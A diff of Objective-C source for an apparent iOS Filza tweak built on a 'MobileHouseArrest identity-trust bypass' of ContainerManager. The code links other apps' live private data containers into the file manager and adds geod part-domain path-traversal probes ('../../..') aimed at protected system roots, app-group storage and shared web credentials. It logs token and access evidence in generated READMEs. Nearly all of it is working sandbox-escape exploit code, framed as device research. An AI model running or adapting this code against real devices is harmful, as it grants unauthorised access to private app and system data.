@@ -81,6 +81,47 @@ static BOOL MCMSafeIdentifier(NSString *identifier)
         ![identifier isEqualToString:@"."] && ![identifier isEqualToString:@".."];
 }
 
+NSArray<NSString *> *MCMFilzaAppDataIdentifiers(void)
+{
+    NSString *directory = [MCMFilzaVirtualRoot()
+        stringByAppendingPathComponent:kMCMAppDataDirectoryName];
+    NSArray<NSString *> *names = [NSFileManager.defaultManager
+        contentsOfDirectoryAtPath:directory error:nil];
+    NSMutableArray<NSString *> *identifiers = [NSMutableArray array];
+    for (NSString *name in names ?: @[]) {
+        if (!MCMSafeIdentifier(name)) continue;
+        NSString *path = [directory stringByAppendingPathComponent:name];
+        struct stat status = {0};
+        if (lstat(path.fileSystemRepresentation, &status) != 0 ||
+            !S_ISLNK(status.st_mode))
+            continue;
+        [identifiers addObject:name];
+    }
+    [identifiers sortUsingSelector:@selector(localizedStandardCompare:)];
+    return identifiers;
+}
+
+NSString *MCMFilzaAppDataPath(NSString *identifier)
+{
+    if (!MCMSafeIdentifier(identifier)) return nil;
+    NSString *link = [[MCMFilzaVirtualRoot()
+        stringByAppendingPathComponent:kMCMAppDataDirectoryName]
+        stringByAppendingPathComponent:identifier];
+    NSError *error = nil;
+    NSString *target = [NSFileManager.defaultManager
+        destinationOfSymbolicLinkAtPath:link error:&error];
+    if (target.length == 0) return nil;
+    if (![target isAbsolutePath])
+        target = [[link stringByDeletingLastPathComponent]
+            stringByAppendingPathComponent:target];
+    target = target.stringByStandardizingPath;
+    int descriptor = open(target.fileSystemRepresentation,
+        O_RDONLY | O_DIRECTORY | O_CLOEXEC | O_NOFOLLOW);
+    if (descriptor < 0) return nil;
+    close(descriptor);
+    return target;
+}
+
 static NSString *MCMActivate(uint64_t containerClass, NSString *identifier,
                              BOOL group, NSString **error)
 {
@@ -94,9 +135,18 @@ static NSString *MCMActivate(uint64_t containerClass, NSString *identifier,
         return nil;
     }
     @synchronized (gLeases) {
-        MCMLease *existing = gLeases[MCMKey(containerClass, identifier)];
-        if (existing.rootPath.length)
-            return existing.rootPath;
+        NSString *key = MCMKey(containerClass, identifier);
+        MCMLease *existing = gLeases[key];
+        if (existing.rootPath.length) {
+            int descriptor = open(existing.rootPath.fileSystemRepresentation,
+                O_RDONLY | O_DIRECTORY | O_CLOEXEC | O_NOFOLLOW);
+            if (descriptor >= 0) {
+                close(descriptor);
+                return existing.rootPath;
+            }
+            [existing invalidate];
+            [gLeases removeObjectForKey:key];
+        }
         NSString *detail = nil;
         MCMLease *lease = [MCMLease leaseForClass:containerClass identifier:identifier
             group:group part:0 flags:kMCMFlags error:&detail];
@@ -121,7 +171,7 @@ static NSString *MCMActivate(uint64_t containerClass, NSString *identifier,
             return nil;
         }
         close(descriptor);
-        gLeases[MCMKey(containerClass, identifier)] = lease;
+        gLeases[key] = lease;
         return lease.rootPath;
     }
 }
@@ -129,44 +179,85 @@ static NSString *MCMActivate(uint64_t containerClass, NSString *identifier,
 static NSString *MCMActivateScoped(uint64_t containerClass, NSString *identifier,
                                    BOOL group, uint64_t part,
                                    NSString *partDomain, uint64_t flags,
+                                   NSMutableDictionary **evidence,
                                    NSString **error)
 {
+    NSMutableDictionary *activation = [NSMutableDictionary dictionary];
+    if (evidence) *evidence = activation;
     MCMEnsureState();
     if (![NSBundle.mainBundle.bundleIdentifier isEqualToString:kRequiredIdentifier]) {
+        activation[@"Stage"] = @"identity-check";
         if (error) *error = @"host bundle identifier is not the required MCM caller identity";
         return nil;
     }
     if (!MCMSafeIdentifier(identifier)) {
+        activation[@"Stage"] = @"identifier-check";
         if (error) *error = @"identifier contains unsupported path characters";
         return nil;
     }
     NSString *key = MCMScopedKey(containerClass, identifier, part, partDomain, flags);
     @synchronized (gLeases) {
         MCMLease *existing = gLeases[key];
-        if (existing.rootPath.length) return existing.rootPath;
+        if (existing.rootPath.length) {
+            activation[@"Stage"] = @"cached-lease";
+            activation[@"QueryReturned"] = @YES;
+            activation[@"ReturnedPath"] = existing.rootPath;
+            activation[@"TokenPresent"] = @(existing.tokenPresent);
+            activation[@"TokenLength"] = @(existing.tokenLength);
+            activation[@"Activated"] = @(existing.activated);
+            activation[@"PreActivationOpen"] = @YES;
+            activation[@"PreActivationOpenErrno"] = @0;
+            activation[@"PostActivationOpen"] = @YES;
+            activation[@"PostActivationOpenErrno"] = @0;
+            return existing.rootPath;
+        }
         NSString *detail = nil;
         MCMLease *lease = [MCMLease leaseForClass:containerClass
             identifier:identifier group:group part:part partDomain:partDomain
             flags:flags error:&detail];
+        activation[@"QueryReturned"] = @(lease != nil);
+        if (lease.rootPath.length) activation[@"ReturnedPath"] = lease.rootPath;
+        int beforeDescriptor = -1;
+        int beforeErrno = 0;
+        if (lease.rootPath.length) {
+            errno = 0;
+            beforeDescriptor = open(lease.rootPath.fileSystemRepresentation,
+                                    O_RDONLY | O_DIRECTORY | O_CLOEXEC);
+            beforeErrno = beforeDescriptor >= 0 ? 0 : errno;
+            if (beforeDescriptor >= 0) close(beforeDescriptor);
+        }
+        activation[@"PreActivationOpen"] = @(beforeDescriptor >= 0);
+        activation[@"PreActivationOpenErrno"] = @(beforeErrno);
         BOOL activated = lease && [lease activate:&detail];
+        activation[@"TokenPresent"] = @(lease.tokenPresent);
+        activation[@"TokenLength"] = @(lease.tokenLength);
+        activation[@"Activated"] = @(activated);
         if (!lease) {
+            activation[@"Stage"] = @"query";
             if (error) *error = detail ?: @"scoped MCM activation failed";
             return nil;
         }
+        if (!lease.tokenPresent || !activated) {
+            activation[@"Stage"] = @"activation";
+            if (error) *error = detail ?: @"scoped MCM token activation failed";
+            [lease invalidate];
+            return nil;
+        }
+        errno = 0;
         int descriptor = open(lease.rootPath.fileSystemRepresentation,
                               O_RDONLY | O_DIRECTORY | O_CLOEXEC);
+        int openErrno = descriptor >= 0 ? 0 : errno;
+        activation[@"PostActivationOpen"] = @(descriptor >= 0);
+        activation[@"PostActivationOpenErrno"] = @(openErrno);
         if (descriptor < 0) {
-            if (!activated) {
-                if (error) *error = detail ?: @"scoped MCM activation failed";
-                [lease invalidate];
-                return nil;
-            }
+            activation[@"Stage"] = @"root-open";
             if (error) *error = [NSString stringWithFormat:
-                @"scoped directory open failed errno=%d", errno];
+                @"scoped directory open failed errno=%d", openErrno];
             [lease invalidate];
             return nil;
         }
         close(descriptor);
+        activation[@"Stage"] = @"ready";
         gLeases[key] = lease;
         return lease.rootPath;
     }
@@ -245,6 +336,23 @@ static void MCMInstallLink(NSString *directory, NSString *identifier,
 {
     MCMInstallLinkWithFailureLogging(directory, identifier, containerClass,
                                      group, YES);
+}
+
+BOOL MCMFilzaEnsureAppDataLink(NSString *identifier, NSString **error)
+{
+    if (!MCMSafeIdentifier(identifier)) {
+        if (error) *error = @"identifier contains unsupported path characters";
+        return NO;
+    }
+    NSString *directory = [MCMFilzaVirtualRoot()
+        stringByAppendingPathComponent:kMCMAppDataDirectoryName];
+    [NSFileManager.defaultManager createDirectoryAtPath:directory
+        withIntermediateDirectories:YES
+        attributes:@{NSFilePosixPermissions: @0700} error:nil];
+    MCMInstallLinkWithFailureLogging(directory, identifier, 2, NO, YES);
+    if (MCMFilzaAppDataPath(identifier).length > 0) return YES;
+    if (error) *error = @"class-2 lookup did not produce an accessible data-container link";
+    return NO;
 }
 
 static NSString *MCMDirectIdentifier(NSString *containerPath, NSString *fallback)
@@ -334,7 +442,7 @@ static void MCMInstallScopedLink(NSString *directory, NSString *linkName,
     NSString *link = [directory stringByAppendingPathComponent:linkName];
     NSString *error = nil;
     NSString *target = MCMActivateScoped(containerClass, identifier, group, part,
-        partDomain, kMCMReadWritePartFlags, &error);
+        partDomain, kMCMReadWritePartFlags, nil, &error);
     if (!target) {
         struct stat stale = {0};
         if (lstat(link.fileSystemRepresentation, &stale) == 0 &&
@@ -561,8 +669,10 @@ static NSDictionary *MCMRunExperimentalProbe(NSString *directory,
     result[@"FlagsHex"] = [NSString stringWithFormat:@"0x%llx", flags];
     [result removeObjectForKey:@"Flags"];
     NSString *detail = nil;
+    NSMutableDictionary *activation = nil;
     NSString *target = MCMActivateScoped(containerClass, identifier, group,
-        part, partDomain, flags, &detail);
+        part, partDomain, flags, &activation, &detail);
+    if (activation.count) result[@"ActivationEvidence"] = activation;
     if (!target) {
         MCMRemoveStaleExperimentalLink(linkPath);
         result[@"Status"] = @"failed";
@@ -571,6 +681,23 @@ static NSDictionary *MCMRunExperimentalProbe(NSString *directory,
     }
 
     result[@"ReturnedPath"] = target;
+    NSString *canonicalTarget = MCMCanonicalLexicalPath(target);
+    result[@"CanonicalReturnedPath"] = canonicalTarget;
+    NSString *expectedRoot = [probe[@"ExpectedRoot"] isKindOfClass:NSString.class]
+        ? MCMCanonicalLexicalPath(probe[@"ExpectedRoot"]) : nil;
+    if (expectedRoot.length) {
+        BOOL matched = [canonicalTarget isEqualToString:expectedRoot];
+        result[@"ExpectedCanonicalPath"] = expectedRoot;
+        result[@"ExpectedRootMatch"] = @(matched);
+        if (!matched) {
+            MCMRemoveStaleExperimentalLink(linkPath);
+            result[@"Status"] = @"failed";
+            result[@"Error"] = [NSString stringWithFormat:
+                @"canonical target mismatch expected=%@ actual=%@",
+                expectedRoot, canonicalTarget];
+            return result;
+        }
+    }
     result[@"ReturnedPathStatus"] = MCMExperimentalPathStatus(target);
     NSMutableArray *expectedStatuses = [NSMutableArray array];
     for (id relativeValue in expected) {
@@ -586,13 +713,84 @@ static NSDictionary *MCMRunExperimentalProbe(NSString *directory,
 
     NSString *linkError = nil;
     BOOL linked = MCMInstallExperimentalSymlink(linkPath, target, &linkError);
-    result[@"Status"] = linked ? @"linked" : @"failed";
+    BOOL preauthorized = [activation[@"PreActivationOpen"] boolValue];
+    result[@"Status"] = linked
+        ? (preauthorized ? @"linked-preauthorized" : @"linked-new-access")
+        : @"failed";
     result[@"LinkPath"] = linkPath;
     if (!linked) result[@"Error"] = linkError ?: @"link creation failed";
     NSLog(@"[MCMFilza] experimental name=%@ class=%llu id=%@ part=%llu domain=%@ status=%@ target=%@ error=%@",
           name, containerClass, identifier, part, partDomain,
           result[@"Status"], target, result[@"Error"]);
     return result;
+}
+
+static NSDictionary *MCMGeodTraversalProbe(NSString *name,
+                                            NSString *partDomain,
+                                            NSString *expectedRoot,
+                                            NSArray<NSString *> *expected)
+{
+    return @{
+        @"Name": name,
+        @"Class": @12,
+        @"Identifier": @"com.apple.geod",
+        @"Group": @NO,
+        @"Part": @3,
+        @"PartDomain": partDomain,
+        @"Flags": @(kMCMReadWritePartFlags),
+        @"ExpectedRoot": expectedRoot,
+        @"Expected": expected ?: @[],
+    };
+}
+
+static NSString *MCMExperimentalReadme(NSArray<NSDictionary *> *results)
+{
+    NSUInteger successful = 0;
+    for (NSDictionary *result in results)
+        if ([result[@"Status"] hasPrefix:@"linked-"]) successful++;
+
+    NSMutableString *readme = [NSMutableString stringWithFormat:
+        @"Experimental consumer traversal\n\n"
+         "MHA means the MobileHouseArrest identity-trust bypass. C10, C12, C13, and C15 identify the ContainerManager class used by each link.\n"
+         "This build keeps only probes that succeeded during the previous 24A5390f device run. Probe numbers remain unchanged so generated results can be compared with that run.\n"
+         "A successful link requires this query to return an object, contain a non-empty token, activate that token, return the exact configured canonical path, open the target directory read-only, and create the link.\n"
+         "linked-new-access means the root was denied before this token and opened after activation. linked-preauthorized means this query passed all checks but an earlier active lease already opened the root, so the access delta is not independently attributable.\n"
+         "Probe setup does not create, modify, rename, delete, or enumerate target contents. Expected subpaths receive lstat/access/read-only-open checks only. The custom Filza copy, paste, and delete routes are disabled inside this folder.\n"
+         "Successful links still point at live directories. Treat them as read-only and do not edit a candidate without a separate backup and exact restore plan.\n\n"
+         "Runtime summary: %lu successful links, %lu failed probes, %lu total.\n\n",
+         (unsigned long)successful,
+         (unsigned long)(results.count - successful),
+         (unsigned long)results.count];
+
+    for (NSDictionary *result in results) {
+        NSString *status = [result[@"Status"] isKindOfClass:NSString.class]
+            ? result[@"Status"] : @"unknown";
+        BOOL linked = [status hasPrefix:@"linked-"];
+        NSDictionary *activation = [result[@"ActivationEvidence"]
+            isKindOfClass:NSDictionary.class] ? result[@"ActivationEvidence"] : @{};
+        [readme appendFormat:@"• %@ — %@ (%@)\n",
+            result[@"Name"] ?: @"Unnamed probe",
+            linked ? @"SUCCESS" : @"FAILED", status];
+        if ([result[@"CanonicalReturnedPath"] isKindOfClass:NSString.class])
+            [readme appendFormat:@"  canonical root: %@\n",
+                result[@"CanonicalReturnedPath"]];
+        if ([result[@"ExpectedCanonicalPath"] isKindOfClass:NSString.class])
+            [readme appendFormat:@"  expected root: %@; match=%@\n",
+                result[@"ExpectedCanonicalPath"],
+                [result[@"ExpectedRootMatch"] boolValue] ? @"yes" : @"no"];
+        [readme appendFormat:
+            @"  stage=%@ token=%@ length=%@ pre-open=%@ post-open=%@\n",
+            activation[@"Stage"] ?: @"unknown",
+            [activation[@"TokenPresent"] boolValue] ? @"yes" : @"no",
+            activation[@"TokenLength"] ?: @0,
+            [activation[@"PreActivationOpen"] boolValue] ? @"yes" : @"no",
+            [activation[@"PostActivationOpen"] boolValue] ? @"yes" : @"no"];
+        if ([result[@"Error"] isKindOfClass:NSString.class])
+            [readme appendFormat:@"  error: %@\n", result[@"Error"]];
+    }
+    [readme appendString:
+        @"\nProbe Results.plist contains the complete machine-readable results, including returned paths, token length, activation state, errno values, canonical-path comparison, and checked subpaths.\n"];
+    return readme;
 }
 
 static void MCMInstallExperimentalFolder(NSString *directory)
@@ -603,8 +801,6 @@ static void MCMInstallExperimentalFolder(NSString *directory)
         @[@"02 MobileGestalt Cache", @"02 [MHA-C13] MobileGestalt Cache"],
         @[@"03 Eligibility Overrides", @"03 [MHA-C12] Eligibility Overrides"],
         @[@"04 App Managed Data", @"04 [MHA-C15] App Managed Data"],
-        @[@"05 Configuration Profiles Root",
-          @"05 [MHA-C13] Configuration Profiles Root"],
         @[@"06 Shared Web Credentials Root",
           @"06 [MHA-C10] Shared Web Credentials Root"],
         @[@"07 System Data Library Control",
@@ -659,17 +855,6 @@ static void MCMInstallExperimentalFolder(NSString *directory)
             ],
         },
         @{
-            @"Name": @"05 [MHA-C13] Configuration Profiles Root",
-            @"Class": @13,
-            @"Identifier": @"systemgroup.com.apple.configurationprofiles",
-            @"Group": @YES,
-            @"Part": @0,
-            @"Flags": @(kMCMReadWritePartFlags),
-            @"Expected": @[
-                @"Library/ConfigurationProfiles/PayloadManifest.plist",
-            ],
-        },
-        @{
             @"Name": @"06 [MHA-C10] Shared Web Credentials Root",
             @"Class": @10,
             @"Identifier": @"com.apple.swcd",
@@ -699,19 +884,47 @@ static void MCMInstallExperimentalFolder(NSString *directory)
             @"Flags": @(kMCMReadWritePartFlags),
             @"Expected": @[@"com.apple.MobileGestalt.plist"],
         },
+        MCMGeodTraversalProbe(@"09 [MHA-C12-T] System Data Root",
+            @"../../..", @"/private/var/containers/Data/System",
+            @[@"com.apple.geod"]),
+        MCMGeodTraversalProbe(@"16 [MHA-C12-T] Protected System Root",
+            @"../../../../ProtectedSystem",
+            @"/private/var/containers/Data/ProtectedSystem", @[]),
+        MCMGeodTraversalProbe(@"17 [MHA-C12-T] Protected Data Root",
+            @"../../../../Protected",
+            @"/private/var/containers/Data/Protected", @[]),
+        MCMGeodTraversalProbe(@"27 [MHA-C12-T] App Groups Root",
+            @"../../../../../../mobile/Containers/Shared/AppGroup",
+            @"/private/var/mobile/Containers/Shared/AppGroup", @[]),
     ];
 
-    NSMutableArray<NSDictionary *> *results = [NSMutableArray array];
-    for (NSDictionary *probe in probes)
-        [results addObject:MCMRunExperimentalProbe(directory, probe)];
+    NSArray<NSDictionary *> *executionOrder = [probes
+        sortedArrayUsingComparator:^NSComparisonResult(NSDictionary *left,
+                                                        NSDictionary *right) {
+        NSString *leftRoot = [left[@"ExpectedRoot"] isKindOfClass:NSString.class]
+            ? left[@"ExpectedRoot"] : nil;
+        NSString *rightRoot = [right[@"ExpectedRoot"] isKindOfClass:NSString.class]
+            ? right[@"ExpectedRoot"] : nil;
+        if (!leftRoot.length && rightRoot.length) return NSOrderedAscending;
+        if (leftRoot.length && !rightRoot.length) return NSOrderedDescending;
+        if (leftRoot.length && rightRoot.length) {
+            NSUInteger leftDepth = MCMCanonicalLexicalPath(leftRoot).pathComponents.count;
+            NSUInteger rightDepth = MCMCanonicalLexicalPath(rightRoot).pathComponents.count;
+            if (leftDepth > rightDepth) return NSOrderedAscending;
+            if (leftDepth < rightDepth) return NSOrderedDescending;
+        }
+        return [left[@"Name"] localizedStandardCompare:right[@"Name"]];
+    }];
+    NSMutableArray<NSDictionary *> *executionResults = [NSMutableArray array];
+    for (NSDictionary *probe in executionOrder)
+        [executionResults addObject:MCMRunExperimentalProbe(directory, probe)];
+    NSArray<NSDictionary *> *results = [executionResults
+        sortedArrayUsingComparator:^NSComparisonResult(NSDictionary *left,
+                                                        NSDictionary *right) {
+        return [left[@"Name"] localizedStandardCompare:right[@"Name"]];
+    }];
 
-    NSString *readme = @"Experimental consumer traversal\n\n"
-        @"MHA means the MobileHouseArrest identity-trust bypass. C10, C12, C13, and C15 identify the ContainerManager class used by each link.\n"
-        @"These are fixed launch-time probes for daemon-consumed files found during the class 10/12/13/15 audit.\n"
-        @"A link appears only after ContainerManager returns a token, activation succeeds, and the returned directory opens read-only.\n"
-        @"Probe setup does not create or modify target files. The custom Filza copy/paste route is disabled inside this folder.\n"
-        @"The links still point at live directories; do not edit a candidate unless you have separately backed it up and planned an exact restore.\n\n"
-        @"Probe Results.plist records failed queries and the read/write/open status of each expected consumer path.\n";
+    NSString *readme = MCMExperimentalReadme(results);
     [readme writeToFile:[directory stringByAppendingPathComponent:@"README.txt"]
               atomically:YES encoding:NSUTF8StringEncoding error:nil];
     [results writeToFile:[directory
@@ -968,9 +1181,9 @@ static void MCMWriteInstructions(void)
         @"MHA means the MobileHouseArrest identity-trust bypass. C2 through C15 identify the ContainerManager class used by each folder.\n"
         @"[MHA-C2] App Data contains class-2 containers resolved from installed app identifiers.\n"
         @"These are live private containers, not copies. Filza edits affect the target app.\n"
-        @"[MHA-Mixed EXP] Experimental contains fixed consumer traversal probes and records failures in Probe Results.plist.\n"
-        @"The custom copy/paste route is disabled there, but successful links still point to live directories.\n"
-        @"This build does not provide root, kernel R/W, arbitrary /var, Keychain, TCC, or app-bundle access.\n\n"
+        @"[MHA-Mixed EXP] Experimental contains only the probes that succeeded during the previous 24A5390f device run. Probe numbers remain unchanged for comparison. README.txt, README - Access.txt, Access Map.txt, and Probe Results.plist record the current run.\n"
+        @"The custom copy, paste, and delete routes are disabled there, but successful links still point at live directories. Treat them as read-only.\n"
+        @"The exact /private/var boundary is a runtime probe, not a predeclared success. This build does not claim root, kernel R/W, Keychain, TCC bypass, or unrestricted app-bundle access.\n\n"
         @"Optional target configuration is documented in the research source repository.\n";
     [text writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil];
 }
@@ -1026,7 +1239,16 @@ static void MCMAppendExperimentalSubpaths(NSMutableString *text,
     NSArray<NSDictionary *> *results = [NSArray arrayWithContentsOfFile:resultsPath];
     if (results.count == 0) return;
 
-    [text appendString:@"\nExperimental returned paths and checked subpaths:\n"];
+    NSUInteger successful = 0;
+    for (NSDictionary *result in results)
+        if ([result[@"Status"] hasPrefix:@"linked-"]) successful++;
+    [text appendFormat:
+        @"\nExperimental result summary: successful=%lu failed=%lu total=%lu.\n"
+         "linked-new-access means the root changed from denied before this token to open after activation. linked-preauthorized means the query and token passed, but an earlier lease already opened that root.\n"
+         "Experimental returned paths and checked subpaths:\n",
+         (unsigned long)successful,
+         (unsigned long)(results.count - successful),
+         (unsigned long)results.count];
     for (NSDictionary *result in results) {
         NSString *name = [result[@"Name"] isKindOfClass:NSString.class]
             ? result[@"Name"] : @"Unnamed probe";
@@ -1036,6 +1258,29 @@ static void MCMAppendExperimentalSubpaths(NSMutableString *text,
             result[@"Status"] ?: @"unknown"];
         if (returnedPath.length > 0)
             [text appendFormat:@"  returned root: %@\n", returnedPath];
+        if ([result[@"CanonicalReturnedPath"] isKindOfClass:NSString.class])
+            [text appendFormat:@"  canonical root: %@\n",
+                result[@"CanonicalReturnedPath"]];
+        if ([result[@"ExpectedCanonicalPath"] isKindOfClass:NSString.class])
+            [text appendFormat:@"  expected root: %@; match=%@\n",
+                result[@"ExpectedCanonicalPath"],
+                [result[@"ExpectedRootMatch"] boolValue] ? @"yes" : @"no"];
+
+        NSDictionary *activation = [result[@"ActivationEvidence"]
+            isKindOfClass:NSDictionary.class] ? result[@"ActivationEvidence"] : @{};
+        [text appendFormat:
+            @"  query=%@ token=%@ token-length=%@ activated=%@ pre-open=%@ (errno=%@) post-open=%@ (errno=%@) stage=%@\n",
+            [activation[@"QueryReturned"] boolValue] ? @"yes" : @"no",
+            [activation[@"TokenPresent"] boolValue] ? @"yes" : @"no",
+            activation[@"TokenLength"] ?: @0,
+            [activation[@"Activated"] boolValue] ? @"yes" : @"no",
+            [activation[@"PreActivationOpen"] boolValue] ? @"yes" : @"no",
+            activation[@"PreActivationOpenErrno"] ?: @0,
+            [activation[@"PostActivationOpen"] boolValue] ? @"yes" : @"no",
+            activation[@"PostActivationOpenErrno"] ?: @0,
+            activation[@"Stage"] ?: @"unknown"];
+        if ([result[@"Error"] isKindOfClass:NSString.class])
+            [text appendFormat:@"  error: %@\n", result[@"Error"]];
 
         NSArray<NSDictionary *> *subpaths =
             [result[@"ExpectedPathStatus"] isKindOfClass:NSArray.class]
@@ -1099,8 +1344,9 @@ static void MCMAppendUnifiedFindingMap(NSMutableString *map)
          "MobileGestalt route summary\n"
          "Direct route: class-13 well-known-group authorization gap -> MobileGestalt Caches.\n"
          "Pivot route: class-12 geod allow path -> part-3 domain traversal -> MobileGestalt Caches.\n"
-         "Both routes reach the same fixed target. Neither route proves arbitrary /var access.\n"
-         "No result here claims root, kernel, Keychain, TCC, or app-bundle access.\n\n"
+         "Both routes reach the same fixed target. Neither original route by itself proves arbitrary /var access.\n"
+         "Mixed entries 09 and later separately test exact canonical roots, including the /private/var boundary; their runtime success or failure is reported below.\n"
+         "No static result here claims root, kernel, Keychain, TCC bypass, or unrestricted app-bundle access.\n\n"
 
          "Current Filza access\n"
          "The sections below are generated during the current launch.\n"
@@ -1190,7 +1436,7 @@ static void MCMWriteAccessMap(NSFileManager *manager, NSString *root)
         @{@"Name": kMCMAdditionalLocationsDirectoryName,
           @"Primitive": @"MHA-MCM class 13 scoped part-domain lookup and sandbox extension"},
         @{@"Name": kMCMExperimentalDirectoryName,
-          @"Primitive": @"MHA-MCM scoped class 10, 12, 13, and 15 probes"},
+          @"Primitive": @"MHA-MCM fixed probes and class-12 geod part-domain traversal targets"},
     ];
 
     NSMutableString *map = [NSMutableString stringWithFormat:
@@ -1320,6 +1566,12 @@ void MCMFilzaStart(void)
                            attributes:@{NSFilePosixPermissions: @0700} error:nil];
         MCMResetAppLinksForTesting(apps);
 
+        // Run Mixed before ordinary MHA container leases. Within Mixed, the
+        // traversal targets execute from the deepest leaf to the broadest
+        // ancestor, with /private/var last. This keeps the pre-activation
+        // baseline as clean as a single process can make it.
+        MCMInstallExperimentalFolder(experimental);
+
         NSMutableOrderedSet *appIdentifiers = [NSMutableOrderedSet orderedSetWithArray:
             MCMDynamicIdentifiers(2)];
         [appIdentifiers addObjectsFromArray:MCMInstalledApplicationIdentifiers()];
@@ -1446,7 +1698,6 @@ void MCMFilzaStart(void)
         MCMInstallScopedLink(additionalLocations,
             @"[MHA-C13] MobileGestalt Cache", 13,
             @"systemgroup.com.apple.mobilegestaltcache", YES, 3, nil);
-        MCMInstallExperimentalFolder(experimental);
         if (!gUnrestrictedFilesystem) {
             for (NSString *directory in @[apps, groups, extensions, vpnData,
                                           serviceData, systemData, systemGroups,
